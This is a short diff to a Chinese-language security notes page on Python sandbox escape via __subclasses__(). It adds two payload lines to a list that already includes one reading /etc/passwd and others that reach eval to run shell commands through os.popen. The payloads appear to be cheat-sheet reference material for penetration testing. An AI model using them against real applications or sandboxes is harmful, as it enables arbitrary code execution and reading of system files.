@@ -74,6 +74,8 @@ python的新式类都保留了它所有的子类的引用，``__subclasses__()``
 ----------------------------------------
 - ``().__class__.__bases__[0].__subclasses__()[40](r'/etc/passwd').read()``
 - ``().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls /").read()' )``
+- ``''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls").read()')``
+- ``''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.values()[13]['eval']('__import__("os").popen("ls").read()')``
 
 绕过技巧
 ----------------------------------------
